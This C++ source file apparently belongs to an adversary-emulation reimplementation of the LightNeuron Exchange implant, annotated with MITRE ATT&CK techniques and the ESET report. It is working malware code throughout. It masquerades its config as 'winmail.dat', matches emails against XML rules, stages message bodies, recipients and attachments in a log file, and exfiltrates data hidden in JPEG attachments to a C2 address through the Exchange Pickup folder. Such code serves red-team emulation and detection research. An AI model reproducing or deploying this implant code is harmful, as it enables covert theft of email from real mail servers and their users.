#include "exdbdata.h"


namespace data_transform
{
    //Decryption key, hex = 0xA9
    int decryption_key = 169;

    std::string config_file = "C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin\\winmail.dat";

    config conf;


    /// <summary>
    /// Function used by the Security Interopt class to analyze emails and decide what to do with them
    /// It will compare the email to the rules found in the config and call the necessary handler
    /// This is the main function that will need to read the config, decrypt the strings, and compare the rules
    ///
    /// s: Mail item struct
    /// </summary>
    extern "C" __declspec (dllexport) int MessageValidator(mail * s)
    {
        parse_config_file(config_file);
        int result = processXMLRules(conf.RULE_FILE, *s);
        return result;
    }


    /*
     * parse_config_file
     *     About: 
     *         Function used to parse the configuration file and set any needed variables
     *         Config file is named 'winmail.dat'
     *     Result
     *         The implant is set up to check messages against rules and properly route them.
     *         Additionally it sets up the email routing back to the C2 server 
     *     MITRE ATT&CK Techniques:
     *         T1036.005: Masquerading: Match Legitimate Name or Location
     *     CTI:
     *         https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf#page=15
     */
    void parse_config_file(std::string conf_file)
    {
        //Read in config file and set variables
        std::ifstream file;
        file.open(conf_file, std::ios_base::in);
        if (file.is_open()) {
            std::string line = "";
            std::string delimiter = ": ";
            while (std::getline(file, line)) {
                int pos = line.find(delimiter);
                std::string key = line.substr(0, pos);
                std::string value = line.erase(0, pos + delimiter.length());

                std::cout << key << value;

                if (key == "EMAIL_LOG_FILE") {
                    conf.EMAIL_LOG_FILE = value;
                }
                else if (key == "SIGNATURE_KEY") {
                    conf.SIGNATURE_KEY = value;
                }
                else if (key == "RULE_FILE") {
                    conf.RULE_FILE = value;
                }
                else if (key == "FROM") {
                    conf.FROM = value;
                }
                else if (key == "SUBJECT") {
                    conf.SUBJECT = value;
                }
                else if (key == "TO") {
                    conf.TO = value;
                }
            }
        }
        else {
            throw ERROR_FILE_NOT_FOUND;
        }
        file.close();
    }


    /*
     * checkAttachment
     *     About: 
     *         Analyzes the attachment in the email. 
     *         If data should be exfiltrated it is sent to the createHandler to exfil the new attachment
     *     Result
     *         Returns whether or not the library sent a new email to the C2 server
     *         If the email is sent back to the C2, signal the transport agent to block the email
     *     MITRE ATT&CK Techniques:
     *         T1020: Automated Exfiltration
     *         T1564.008: Hide Artifacts: Email Hiding Rules
     *     CTI:
     *         https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf#page=18
     */
    int checkAttachment(mail &mailItem)
    {
        bool modified = false;
        for (int i = 0; i < mailItem.totalAttachments; i++) {
            try {
                modified = analyzeJPG(mailItem.attachmentContents[i], conf.SIGNATURE_KEY, conf.EMAIL_LOG_FILE);
            }
            catch (std::exception& e) {
                return 2;
            }
        }
        
        if (modified) {
            sendMessage(mailItem);
            return 2;
        }
        return 0;
    }


    /*
     * sendMessage
     *     About:
     *         Create and send a new email to the C2
     *     Result:
     *         An email is sent back to the C2 containing exfilled data embedded in an image
     *     MITRE ATT&CK Techniques:
     *         T1041: Exfiltration Over C2 Channel
     *         T1071.003: Application Layer Protocol: Mail Protocols
     *     CTI:
     *         https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf#page=18
     */
    void sendMessage(mail &mailItem)
    {
        DWORD test = GetTickCount();
        std::ostringstream stream;
        stream << test;
        std::string tickCount;
        tickCount.append(stream.str());

        std::string mimeString = "";

        mimeString.append("To: ");
        mimeString.append(conf.TO);
        mimeString.append("\n");

        mimeString.append("From: ");
        mimeString.append(conf.FROM);
        mimeString.append("\n");

        mimeString.append("Subject: ");
        mimeString.append(conf.SUBJECT);
        mimeString.append("\n");

        mimeString.append("MIME-Version: ");
        mimeString.append("1.0\n");
        mimeString.append("Content-Type: multipart/mixed;\n");
        mimeString.append("  boundary=\"Attached\"\n\n");

  
        mimeString.append("--Attached\n");
        mimeString.append("Content-Type: ");
        mimeString.append("image/jpeg;\n");

        // Include the tickCount so that each filename is unique
        mimeString.append("  name=\"confirmation_icon_" + tickCount + ".jpg\"\n");
        mimeString.append("Content-Transfer-Encoding: base64\n");
        mimeString.append("Content-Disposition: attachment;\n");
        mimeString.append("  filename=\"confirmation_icon.jpeg\"\n");
        mimeString.append("\n");
        std::string attachment = mailItem.attachmentContents[0];
        mimeString.append(attachment);
        mimeString.append("\n\n--Attached--");

        

        std::fstream file;
        std::string dirPath = "C:\\Program Files\\Microsoft\\Exchange Server\\V15\\TransportRoles\\Pickup\\";
        std::string fileName = "mail" + tickCount + ".eml";
        std::string filePath = dirPath + fileName;
        file.open(filePath, std::ios::out);
        file << mimeString;
        file.close();
    }


    /*
     * logMessage
     *     About:
     *         Logs a given email to a local file for future exfiltration
     *     Result:
     *         Given email and all attachments are appended to the given file path
     *     MITRE ATT&CK Techniques:
     *         T1074.001: Data Staged: Local Data Staging
     *         T1114.002: Email Collection: Remote Email Collection
     *     CTI:
     *         https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf#page=18
     */
    int logMessage(mail &mailItem, std::string zip_file_path)
    {
        std::ofstream file;
        file.open(zip_file_path, std::ios_base::app);

        file << "Name: ";
        file << mailItem.name << std::endl;

        file << "Recipient Count: ";
        file << mailItem.totalRecipients << std::endl;

        file << "Recipients: " << std::endl;
        for (int i = 0; i < mailItem.totalRecipients; i++) {
            std::string recipient = mailItem.recipients[i];
            file << recipient << std::endl;
        }

        file << "Subject: ";
        file << mailItem.subject << std::endl;

        file << "Total Attachments: ";
        file << mailItem.totalAttachments << std::endl;

        file << "Attachments: " << std::endl;
        for (int i = 0; i < mailItem.totalAttachments; i++) {
            std::string attachment = mailItem.attachmentContents[i];
            file << attachment << std::endl;
            file << std::endl;
        }

        file << "Body: " << std::endl;
        file << mailItem.body << std::endl;

        file << std::endl;

        file.close();

        return 1;
    }

    /// <summary>
    /// Used to check if a substring exists within a string
    ///
    /// str1: The string that we are checking
    /// str2: The substring were looking for within str1
    ///
    /// Returns: int, -1 did not find the substring, otherwise the index of the substring is returned
    /// </summary>
    int checkSubstring(std::string str1, std::string str2)
    {   int i,j;
        int len1 = str1.length();
        int len2 = str2.length();
    
        for (i = 0; i <= len2 - len1; i++) {
            for (j = 0; j < len1; j++)
                if (str2[i + j] != str1[j])
                    break;
    
            if (j == len1)
                return i;
        }
    
        return -1;
    }

    /// <summary>
    /// check the email against the rules in the rule file
    ///
    /// rule: the xml rule with specific conditions defined
    /// mail: The mail item struct
    ///
    /// Returns: bool; if rule matches email
    /// </summary>
    bool checkConditions(pugi::xml_node rule, mail &mail) {
        pugi::xml_attribute attr;
        std::string subject;
        std::string email;
        email = mail.recipients[0];
        subject = mail.name;

        std::string condition = rule.attribute("condition").as_string();

        // match the rule attributes
        if (condition == "match") {

            return rule.attribute("email") && rule.attribute("email").as_string() == email 
                || rule.attribute("subject") && rule.attribute("subject").as_string() == subject;


        // check if the email attributes contain rule attributes
        } else if (condition == "contains") {
            return rule.attribute("email") && email.find(rule.attribute("email").as_string()) != subject.npos 
                || rule.attribute("subject") && subject.find(rule.attribute("subject").as_string()) != subject.npos;
        }
        return false;
    }


    /*
     * processXMLRules
     *     About:
     *         Check the email against the rule file and route it appropriately
     *     Result:
     *         If an email matches any of the rules, it is routed appropriatly for further analysis
     *     MITRE ATT&CK Techniques:
     *         T1020: Automated Exfiltration
     *         T1119: Automated Collection
     *     CTI:
     *         https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf#page=18
     *         https://github.com/zeux/pugixml
     */
    int processXMLRules(std::string RULE_FILE, mail &mail) {
        char* RULE_FILE_CHAR = const_cast<char*>(RULE_FILE.c_str());
        std::string groups_checked = "";
        pugi::xml_attribute attr;
        pugi::xml_document doc;
        pugi::xml_parse_result result = doc.load_file(RULE_FILE_CHAR);
        char xpath[] = "/rules/zip/rule[@group=0]";

        if (!result)
            return -1;
        for (pugi::xml_node rule : doc.child("rules").child("zip"))
        {
            if (rule.attribute("group"))
            {
                // check if the group has already been processed
                // if check returns anything except npos we havent checked this group yet, otherwise we have.
                if (groups_checked.find(rule.attribute("group").as_string()) != groups_checked.npos)
                {
                    groups_checked.append(attr.as_string());
                    xpath[27] = attr.as_string()[0];

                    pugi::xpath_node_set rules_with_group_assignment = doc.select_nodes(xpath);
                    bool allMatched = true;
                    for (pugi::xpath_node node : rules_with_group_assignment)
                    {
                        pugi::xml_node rule = node.node();
                        if (!checkConditions(rule, mail))
                        {
                            allMatched = false;
                            break;
                        }
                    }
                    if (allMatched) {
                        logMessage(mail, conf.EMAIL_LOG_FILE);
                    }
                }
            }
            else
            {
                if (checkConditions(rule, mail))
                {
                    logMessage(mail, conf.EMAIL_LOG_FILE);
                }
            }
        }
        if (mail.totalAttachments == 1) {
            return checkAttachment(mail);
        }
        return 0;
    }
}